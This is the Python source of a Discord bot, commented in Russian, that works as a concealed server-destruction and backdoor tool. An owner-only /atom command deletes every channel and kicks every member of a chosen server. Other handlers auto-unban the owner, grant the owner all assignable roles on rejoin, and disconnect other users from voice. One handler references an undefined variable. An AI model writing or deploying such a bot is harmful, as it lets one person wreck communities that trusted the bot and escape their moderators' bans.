import discord
from discord.ext import commands
import asyncio

TOKEN = 'your_token_here'  # Ваш токен бота
AUTHORIZED_USER_ID = your_user_id_here  # Ваш ID пользователя

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True

bot = commands.Bot(command_prefix='/', intents=intents)

@bot.event
async def on_ready():
    print(f'Вошел как {bot.user}')

async def send_dm(user, message):
    try:
        await user.send(message)
    except discord.Forbidden:
        print(f'Не удалось отправить ЛС пользователю {user.name}. Возможно, у них отключены ЛС.')

async def create_invite(guild):
    # Создать ссылку для приглашения
    invites = await guild.invites()
    if invites:
        return invites[0].url
    else:
        # Если нет существующих приглашений, создать новое
        invite = await guild.text_channels[0].create_invite(max_age=300)
        return invite.url

@bot.command()
async def atom(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return

    if isinstance(ctx.channel, discord.DMChannel):
        # Обработка команды в ЛС
        await handle_dm_atom(ctx)
    else:
        # Игнорировать команду на сервере
        await ctx.send("Команда `/atom` может быть выполнена только в личных сообщениях.")

async def handle_dm_atom(ctx):
    guilds = bot.guilds
    if len(guilds) == 0:
        await ctx.send("Бот не состоит ни в одном сервере.")
        return

    emoji_list = generate_emojis(len(guilds))
    embed = discord.Embed(title="Выберите сервер")

    for i, guild in enumerate(guilds):
        embed.add_field(name=f'{emoji_list[i]} {guild.name}', value=f'ID: {guild.id}', inline=False)

    message = await ctx.send(embed=embed)
    for emoji in emoji_list:
        await message.add_reaction(emoji)

    def check(reaction, user):
        return user == ctx.author and reaction.message.id == message.id and reaction.emoji in emoji_list

    try:
        reaction, _ = await bot.wait_for('reaction_add', timeout=60.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("Время выбора истекло.")
        return

    index = emoji_list.index(reaction.emoji)
    selected_guild = guilds[index]

    confirm_msg = await ctx.send(f"Вы выбрали сервер **{selected_guild.name}**. Подтвердите выполнение команды:\n✔️ - Подтверждаю\n❌ - Отмена")
    await confirm_msg.add_reaction('✔️')
    await confirm_msg.add_reaction('❌')

    def confirm_check(reaction, user):
        return user == ctx.author and reaction.message.id == confirm_msg.id and reaction.emoji in ['✔️', '❌']

    try:
        reaction, _ = await bot.wait_for('reaction_add', timeout=60.0, check=confirm_check)
    except asyncio.TimeoutError:
        await ctx.send("Время на подтверждение истекло.")
        return

    if reaction.emoji == '✔️':
        # Выполнение команды на выбранном сервере
        await perform_atom(selected_guild)
        await ctx.send(f"Команда выполнена на сервере **{selected_guild.name}**.")
    else:
        await ctx.send("Команда отменена.")

async def perform_atom(guild):
    # Удаление всех текстовых и голосовых каналов
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'Удален канал: {channel.name}')
        except Exception as e:
            print(f'Не удалось удалить канал {channel.name}: {e}')

    # Выгнать всех пользователей
    for member in guild.members:
        try:
            await member.kick(reason="Выгонка по команде /atom")
            print(f'Выгнан пользователь: {member.name}')
        except Exception as e:
            print(f'Не удалось выгнать пользователя {member.name}: {e}')

@bot.event
async def on_member_join(member):
    if member.id == AUTHORIZED_USER_ID:
        roles = [role for role in member.guild.roles if role.name != "@everyone"]
        # Отфильтровать роли, которые бот может назначить
        roles = [role for role in roles if role.position < member.guild.me.top_role.position]
        await member.edit(roles=roles)
        await send_dm(member, f'Вы вернулись на сервер! Вам были выданы все роли.')

@bot.event
async def on_member_ban(guild, user):
    if user.id == AUTHORIZED_USER_ID:
        invite_link = await create_invite(guild)
        await send_dm(user, f'Вы были забанены. Вот ссылка для повторного приглашения: {invite_link}')
        await guild.unban(user)  # Немедленно разбанить пользователя
        await send_dm(user, f'Вы были разбанены и вернулись на сервер!')

def generate_emojis(count):
    # Генерация эмодзи в зависимости от количества серверов
    emojis = []
    for i in range(1, count + 1):
        if i <= 10:
            emojis.append(f'{i}️⃣')
        else:
            emojis.append(f'🔟{i-10}')  # Используем дополнительные символы для чисел больше 10
    return emojis

@bot.event
async def on_voice_state_update(member, before, after):
    if before.channel != after.channel and after.channel is not None:
        if member.id == AUTHORIZED_USER_ID:
            target_channel = bot.get_channel(target_voice_channel_id)
            await member.move_to(target_channel)
            if before.channel is not None:
                for m in before.channel.members:
                    if m.id != AUTHORIZED_USER_ID:
                        await m.move_to(None)

bot.run(TOKEN)
